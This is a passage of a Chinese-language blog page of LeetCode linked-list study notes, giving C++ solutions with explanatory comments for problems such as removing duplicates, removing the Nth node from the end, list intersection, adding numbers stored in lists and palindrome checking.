class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="83-删除排序链表中的重复元素——留一个"><a href="#83-删除排序链表中的重复元素——留一个" class="headerlink" title="83 删除排序链表中的重复元素——留一个"></a>83 删除排序链表中的重复元素——留一个</h3><p>如果重复，只留下其中一个</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//双指针</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">deleteDuplicates</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(head == <span class="literal">nullptr</span>||head-&gt;next==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        ListNode *l = head,*r = l-&gt;next;</span><br><span class="line">        <span class="keyword">while</span>(r)&#123;<span class="comment">//右指针 用来遍历</span></span><br><span class="line">            <span class="keyword">if</span>(l-&gt;val!=r-&gt;val)&#123;</span><br><span class="line">                l-&gt;next = r;<span class="comment">//左指针 用来衔接</span></span><br><span class="line">                l = l-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            r = r-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        l-&gt;next = r;<span class="comment">//l-&gt;next = nullptr;</span></span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//一次遍历 O(n)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">deleteDuplicates</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!head)   <span class="comment">//判空</span></span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        ListNode *cur = head;</span><br><span class="line">        <span class="keyword">while</span>(cur-&gt;next)&#123;</span><br><span class="line">            <span class="keyword">if</span>(cur-&gt;val == cur-&gt;next-&gt;val)</span><br><span class="line">                cur-&gt;next = cur-&gt;next-&gt;next;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                cur = cur-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//递归</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">deleteDuplicates</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (head == <span class="literal">nullptr</span> || head-&gt;next == <span class="literal">nullptr</span>) </span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        head-&gt;next = <span class="built_in">deleteDuplicates</span>(head-&gt;next);</span><br><span class="line">        <span class="keyword">return</span> </span><br><span class="line">            head-&gt;val == head-&gt;next-&gt;val ? head-&gt;next : head;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="82-删除排序链表中的重复元素Ⅱ——都删除"><a href="#82-删除排序链表中的重复元素Ⅱ——都删除" class="headerlink" title="82 删除排序链表中的重复元素Ⅱ——都删除"></a>82 删除排序链表中的重复元素Ⅱ——都删除</h3><p>删除重复结点：只要是重复的，都删除</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">deleteDuplicates</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!head)</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        ListNode *dummy = <span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">0</span>,head);</span><br><span class="line">        <span class="comment">//多个 pre 是前驱结点</span></span><br><span class="line">        ListNode *pre = dummy;</span><br><span class="line">        pre-&gt;next = head;</span><br><span class="line">        ListNode *cur = head;<span class="comment">//cur用于遍历</span></span><br><span class="line">        <span class="keyword">while</span>(cur!=<span class="literal">nullptr</span> &amp;&amp; cur-&gt;next!=<span class="literal">nullptr</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(cur-&gt;val == cur-&gt;next-&gt;val)&#123;</span><br><span class="line">                <span class="keyword">int</span> val = cur-&gt;val;</span><br><span class="line">                <span class="keyword">while</span>(cur!=<span class="literal">nullptr</span> &amp;&amp; cur-&gt;val == val)</span><br><span class="line">                    cur = cur-&gt;next;<span class="comment">//找不重复的 cur</span></span><br><span class="line">                pre-&gt;next = cur;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                pre = cur;</span><br><span class="line">                cur = cur-&gt;next;<span class="comment">//后移</span></span><br><span class="line">            &#125; </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dummy-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="19-删除链表的倒数第-N-个结点"><a href="#19-删除链表的倒数第-N-个结点" class="headerlink" title="19 删除链表的倒数第 N 个结点"></a>19 删除链表的倒数第 N 个结点</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    找到倒数n结点的位置，让其 前驱结点的next 指向 其next的next</span></span><br><span class="line"><span class="comment">    倒数第n个结点：正数第len-n+1个结点</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getLength</span><span class="params">(ListNode *head)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(head)&#123;</span><br><span class="line">            len++;</span><br><span class="line">            head = head-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> len;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">ListNode* <span class="title">removeNthFromEnd</span><span class="params">(ListNode* head, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//虚拟头结点：由于可能删除第一个结点</span></span><br><span class="line">        ListNode *dummy = <span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">0</span>,head);</span><br><span class="line">        <span class="keyword">int</span> len = <span class="built_in">getLength</span>(head);</span><br><span class="line">        ListNode *cur = dummy;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;len-n+<span class="number">1</span>;i++)&#123;<span class="comment">//找其前驱</span></span><br><span class="line">            cur = cur-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        cur-&gt;next = cur-&gt;next-&gt;next;<span class="comment">//删除结点</span></span><br><span class="line">        ListNode *ans = dummy-&gt;next;</span><br><span class="line">        <span class="keyword">delete</span> dummy;<span class="comment">//释放空间</span></span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//双指针</span></span><br><span class="line"><span class="comment">//first 比 second 超前n个结点，first到尾结点时，second刚好到要删除结点的【前驱结点】</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">removeNthFromEnd</span><span class="params">(ListNode* head, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        ListNode *dummy = <span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">0</span>,head);</span><br><span class="line">        ListNode *first = head,*second = dummy;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;<span class="comment">//first 比 second超前n个结点   </span></span><br><span class="line">            first = first-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(first)&#123;</span><br><span class="line">            first = first-&gt;next;</span><br><span class="line">            second = second-&gt;next;</span><br><span class="line">            <span class="comment">//因为second初始位置是dummy，所以最后指向被删结点的前驱</span></span><br><span class="line">        &#125;</span><br><span class="line">        second-&gt;next = second-&gt;next-&gt;next;<span class="comment">//删除结点</span></span><br><span class="line">        ListNode *ans = dummy-&gt;next;</span><br><span class="line">        <span class="keyword">delete</span> dummy;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="面试题-02-07-链表相交"><a href="#面试题-02-07-链表相交" class="headerlink" title="面试题 02.07. 链表相交"></a>面试题 02.07. 链表相交</h3><p>给你两个单链表的头节点 headA 和 headB ，请你找出并<strong>返回两个单链表相交的起始节点</strong>。如果两个链表没有交点，返回 null。<br>题目数据 保证 整个链式结构中不存在环。<br>注意，函数返回结果后，链表必须 保持其原始结构 。<br><strong>求两个链表交点节点的指针。 这里同学们要注意，交点不是数值相等，而是 指针相等【next指向同一结点】。看下图：</strong><br><img src="https://img-blog.csdnimg.cn/b96a4ea1680f4da29b48916ddba26b2f.png"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    双指针：同时更新 pA pB</span></span><br><span class="line"><span class="comment">    a+c+b == b+c+a</span></span><br><span class="line"><span class="comment">    pA为空，则指向B链表；pB为空，则指向A链表</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode *<span class="title">getIntersectionNode</span><span class="params">(ListNode *headA, ListNode *headB)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(headA==<span class="literal">NULL</span> || headB==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        ListNode *pA = headA, *pB = headB;</span><br><span class="line">        <span class="keyword">while</span>(pA != pB)&#123;</span><br><span class="line">            pA = pA==<span class="literal">NULL</span>? headB:pA-&gt;next;</span><br><span class="line">            pB = pB==<span class="literal">NULL</span>? headA:pB-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> pB;<span class="comment">//返回的是 相交结点 的指针</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    哈希集合O(m+n)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode *<span class="title">getIntersectionNode</span><span class="params">(ListNode *headA, ListNode *headB)</span> </span>&#123;</span><br><span class="line">        unordered_set&lt;ListNode *&gt; visited;</span><br><span class="line">        ListNode *tmp = headA;</span><br><span class="line">        <span class="keyword">while</span>(tmp != <span class="literal">NULL</span>)&#123;</span><br><span class="line">            visited.<span class="built_in">insert</span>(tmp);<span class="comment">//存的是指针【结点】！！！</span></span><br><span class="line">            tmp = tmp-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        tmp = headB;</span><br><span class="line">        <span class="keyword">while</span>(tmp != <span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(visited.<span class="built_in">count</span>(tmp))&#123;</span><br><span class="line">                <span class="keyword">return</span> tmp;<span class="comment">//寻找 指针相同【结点相同】</span></span><br><span class="line">            &#125;</span><br><span class="line">            tmp = tmp-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="2-两数相加——【逆序】存储在链表中"><a href="#2-两数相加——【逆序】存储在链表中" class="headerlink" title="2 两数相加——【逆序】存储在链表中"></a>2 两数相加——【逆序】存储在链表中</h3><p>给你两个 非空 的链表，表示<strong>两个非负的整数</strong>。它们每位数字都是按照 <strong>逆序 的方式存储</strong>的，并且每个节点只能存储 一位 数字。<br>请你将两个数相加，并以相同形式<strong>返回一个表示和的链表【逆序存储】</strong>。<br>你可以假设除了数字 0 之外，这两个数都不会以 0 开头。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">逆序相加，逆序存储</span></span><br><span class="line"><span class="comment">l1:2 4 3</span></span><br><span class="line"><span class="comment">l2:5 6 4</span></span><br><span class="line"><span class="comment">返回：</span></span><br><span class="line"><span class="comment">   7 0 8</span></span><br><span class="line"><span class="comment">注意进位 carry 和最后的</span></span><br><span class="line"><span class="comment">    if(carry &gt; 0)</span></span><br><span class="line"><span class="comment">        tail-&gt;next = new ListNode(carry);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">addTwoNumbers</span><span class="params">(ListNode* l1, ListNode* l2)</span> </span>&#123;</span><br><span class="line">        ListNode *head = <span class="literal">nullptr</span>,*tail = <span class="literal">nullptr</span>;<span class="comment">//头结点和尾结点</span></span><br><span class="line">        <span class="keyword">int</span> carry = <span class="number">0</span>;<span class="comment">//进位</span></span><br><span class="line">        <span class="keyword">while</span>(l1 || l2)&#123;</span><br><span class="line">            <span class="keyword">int</span> n1 = l1?l1-&gt;val:<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">int</span> n2 = l2?l2-&gt;val:<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">int</span> sum = n1+n2+carry;</span><br><span class="line">            <span class="keyword">if</span>(!head)&#123;</span><br><span class="line">                head = tail = <span class="keyword">new</span> <span class="built_in">ListNode</span>(sum%<span class="number">10</span>);<span class="comment">//新建链表</span></span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                tail-&gt;next = <span class="keyword">new</span> <span class="built_in">ListNode</span>(sum%<span class="number">10</span>);</span><br><span class="line">                tail = tail-&gt;next;<span class="comment">//尾结点后移</span></span><br><span class="line">            &#125;</span><br><span class="line">            carry = sum / <span class="number">10</span>;   <span class="comment">//进位</span></span><br><span class="line">            <span class="keyword">if</span>(l1)</span><br><span class="line">                l1 = l1-&gt;next;</span><br><span class="line">            <span class="keyword">if</span>(l2)</span><br><span class="line">                l2 = l2-&gt;next; </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(carry &gt; <span class="number">0</span>)<span class="comment">//最后如果还有进位的话</span></span><br><span class="line">            tail-&gt;next = <span class="keyword">new</span> <span class="built_in">ListNode</span>(carry);</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="445-两数相加-II——【正序】存储在链表中"><a href="#445-两数相加-II——【正序】存储在链表中" class="headerlink" title="445 两数相加 II——【正序】存储在链表中"></a>445 两数相加 II——【正序】存储在链表中</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">逆序问题，用栈！！！！！！！！</span></span><br><span class="line"><span class="comment">l1:7 2 4 3</span></span><br><span class="line"><span class="comment">l2:  5 6 4</span></span><br><span class="line"><span class="comment">返回：</span></span><br><span class="line"><span class="comment">   7 8 0 7</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">addTwoNumbers</span><span class="params">(ListNode* l1, ListNode* l2)</span> </span>&#123;</span><br><span class="line">        stack&lt;<span class="keyword">int</span>&gt;s1,s2;</span><br><span class="line">        <span class="keyword">while</span>(l1)&#123;</span><br><span class="line">            s1.<span class="built_in">push</span>(l1-&gt;val);</span><br><span class="line">            l1 = l1-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(l2)&#123;</span><br><span class="line">            s2.<span class="built_in">push</span>(l2-&gt;val);</span><br><span class="line">            l2 = l2-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> carry = <span class="number">0</span>;</span><br><span class="line">        ListNode *ans = <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="keyword">while</span>(!s1.<span class="built_in">empty</span>() <span class="keyword">or</span> !s2.<span class="built_in">empty</span>() <span class="keyword">or</span> carry!=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">int</span> a = s1.<span class="built_in">empty</span>()?<span class="number">0</span>:s1.<span class="built_in">top</span>();</span><br><span class="line">            <span class="keyword">int</span> b = s2.<span class="built_in">empty</span>()?<span class="number">0</span>:s2.<span class="built_in">top</span>();</span><br><span class="line">            <span class="keyword">if</span>(!s1.<span class="built_in">empty</span>())</span><br><span class="line">                s1.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="keyword">if</span>(!s2.<span class="built_in">empty</span>())</span><br><span class="line">                s2.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="keyword">int</span> sum = a + b + carry;</span><br><span class="line">            carry = sum/<span class="number">10</span>;</span><br><span class="line">            sum = sum%<span class="number">10</span>;</span><br><span class="line">            <span class="keyword">auto</span> node = <span class="keyword">new</span> <span class="built_in">ListNode</span>(sum);</span><br><span class="line">            node-&gt;next = ans;</span><br><span class="line">            ans = node;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;<span class="comment">//正序返回</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="8-回文链表"><a href="#8-回文链表" class="headerlink" title="8 回文链表"></a>8 回文链表</h3><p>push_back() 向容器尾部添加元素时，首先会创建这个元素，然后再将这个元素拷贝或者移动到容器中（如果是拷贝的话，事后会自行销毁先前创建的这个元素）；<br>emplace_back() 在实现时，则是直接在容器尾部创建这个元素，省去了拷贝或移动元素的过程。<br><strong>判断是否是回文链表</strong><br>eg:[1,2,3,2,1]</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    数组列表+双指针</span></span><br><span class="line"><span class="comment">    复制链表值到 数组列表 中。</span></span><br><span class="line"><span class="comment">    使用双指针法判断是否为回文。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">第一步： 遍历链表并将值复制到数组中，O(n)。</span></span><br><span class="line"><span class="comment">第二步：双指针判断是否为回文，执行了 O(n/2) 次的判断，即O(n)。</span></span><br><span class="line"><span class="comment">总的时间复杂度：O(2n) = O(n)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isPalindrome</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; vals;</span><br><span class="line">        <span class="keyword">while</span>(head != <span class="literal">nullptr</span>)&#123;</span><br><span class="line">            vals.<span class="built_in">emplace_back</span>(head-&gt;val);</span><br><span class="line">            head = head-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,j=vals.<span class="built_in">size</span>()<span class="number">-1</span>; i&lt;j; i++,j--)&#123;</span><br><span class="line">            <span class="keyword">if</span>(vals[i] != vals[j])</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    快慢指针O(n)</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    找到前半部分链表的尾节点。</span></span><br><span class="line"><span class="comment">    反转后半部分链表。</span></span><br><span class="line"><span class="comment">    判断是否回文。</span></span><br><span class="line"><span class="comment">    恢复链表。</span></span><br><span class="line"><span class="comment">    返回结果。</span></span><br><span class="line"><span class="comment">寻找链表前半部分的尾结点：</span></span><br><span class="line"><span class="comment">    使用快慢指针在一次遍历中找到：慢指针一次走一步，快指针一次走两步，快慢指针同时出发。当快指针移动到链表的末尾时，慢指针恰好到链表的中间。通过慢指针将链表分为两部分。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isPalindrome</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(head == <span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        ListNode *firstHalfEnd = <span class="built_in">endOfFirstHalf</span>(head);<span class="comment">//寻找链表前半部分的尾结点</span></span><br><span class="line">        ListNode *secondHalfStart = <span class="built_in">reverseList</span>(firstHalfEnd-&gt;next);<span class="comment">//逆置 链表后半部分</span></span><br><span class="line">        <span class="comment">//比较两个链表（分别为前半部分和后半部分）</span></span><br><span class="line">        ListNode *p1 = head;</span><br><span class="line">        ListNode *p2 = secondHalfStart;</span><br><span class="line">        <span class="keyword">bool</span> res = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">while</span>(res &amp;&amp; p2!=<span class="literal">nullptr</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(p1-&gt;val != p2-&gt;val)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            p1 = p1-&gt;next;</span><br><span class="line">            p2 = p2-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        firstHalfEnd-&gt;next = <span class="built_in">reverseList</span>(secondHalfStart);<span class="comment">//恢复原链表</span></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//链表逆置(反转链表)</span></span><br><span class="line">    <span class="function">ListNode *<span class="title">reverseList</span><span class="params">(ListNode *head)</span></span>&#123;</span><br><span class="line">        ListNode *pre = <span class="literal">nullptr</span>;</span><br><span class="line">        ListNode *cur = head;</span><br><span class="line">        <span class="keyword">while</span>(cur != <span class="literal">nullptr</span>)&#123;</span><br><span class="line">            ListNode *tmp = cur-&gt;next;</span><br><span class="line">            cur-&gt;next = pre;</span><br><span class="line">            pre = cur;</span><br><span class="line">            cur = tmp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> pre;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//寻找链表前半部分尾结点（快慢指针法）</span></span><br><span class="line">    <span class="function">ListNode *<span class="title">endOfFirstHalf</span><span class="params">(ListNode *head)</span></span>&#123;</span><br><span class="line">        ListNode *fast = head;</span><br><span class="line">        ListNode *slow = head;</span><br><span class="line">        <span class="keyword">while</span>(fast-&gt;next!=<span class="literal">nullptr</span> &amp;&amp; fast-&gt;next-&gt;next!=<span class="literal">nullptr</span>)&#123;</span><br><span class="line">            fast = fast-&gt;next-&gt;next;</span><br><span class="line">            slow = slow-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> slow;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="剑指-Offer-06-从尾到头打印链表"><a href="#剑指-Offer-06-从尾到头打印链表" class="headerlink" title="剑指 Offer 06 从尾到头打印链表"></a>剑指 Offer 06 从尾到头打印链表</h3><p>输入一个链表的头节点，<strong>从尾到头反过来返回</strong>每个节点的值（用数组返回）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    后数组反转</span></span><br><span class="line"><span class="comment">    注意：排序 ！= 反转</span></span><br><span class="line"><span class="comment">    swap(res[i],res[res.size()-i-1]);//首尾【下标】交换</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">reversePrint</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; res;</span><br><span class="line">        <span class="keyword">while</span>(head!=<span class="literal">NULL</span>)&#123;<span class="comment">//先全部装入</span></span><br><span class="line">            res.<span class="built_in">push_back</span>(head-&gt;val);</span><br><span class="line">            head = head-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;res.<span class="built_in">size</span>()/<span class="number">2</span>;i++)&#123;</span><br><span class="line">            <span class="built_in">swap</span>(res[i],res[res.<span class="built_in">size</span>()-i<span class="number">-1</span>]);<span class="comment">//首尾交换</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//或者使用  reverse(res.begin(), res.end());</span></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    栈：先进后出</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">reversePrint</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; res;</span><br><span class="line">        stack&lt;<span class="keyword">int</span>&gt; s;</span><br><span class="line">        <span class="keyword">while</span>(head)&#123;</span><br><span class="line">            s.<span class="built_in">push</span>(head-&gt;val);</span><br><span class="line">            head = head-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(!s.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            res.<span class="built_in">push_back</span>(s.<span class="built_in">top</span>());</span><br><span class="line">            s.<span class="built_in">pop</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    先反转链表，再装入</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">reversePrint</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; res;</span><br><span class="line">        <span class="comment">//反转链表</span></span><br><span class="line">        ListNode *pre = <span class="literal">nullptr</span>;</span><br><span class="line">        ListNode *cur = head;</span><br><span class="line">        <span class="keyword">while</span>(cur!=<span class="literal">nullptr</span>)&#123;</span><br><span class="line">            ListNode *tmp = cur-&gt;next;</span><br><span class="line">            cur-&gt;next = pre;</span><br><span class="line">            pre = cur;</span><br><span class="line">            cur = tmp;</span><br><span class="line">        &#125;<span class="comment">//最后cur和tmp均指向原始链表的末尾null,而pre指向原始链表的尾结点</span></span><br><span class="line">        <span class="keyword">while</span>(pre)&#123;</span><br><span class="line">            res.<span class="built_in">push_back</span>(pre-&gt;val);</span><br><span class="line">            pre = pre-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="9-分隔链表——分成k份"><a href="#9-分隔链表——分成k份" class="headerlink" title="9 分隔链表——分成k份"></a>9 分隔链表——分成k份</h3><p>给你一个头结点为 head 的单链表和一个整数 k ，设计算法<strong>将链表分隔为 k 个连续的部分</strong>。<br>每部分的长度应该尽可能的相等：任意两部分的长度差距不能超过 1 。这可能会导致有些部分为 null 。<br>这 k 个部分应该按照在链表中出现的顺序排列，并且<strong>排在前面的部分的长度应该大于或等于排在后面的长度</strong>。<br>返回一个由上述 k 部分组成的数组。</p>
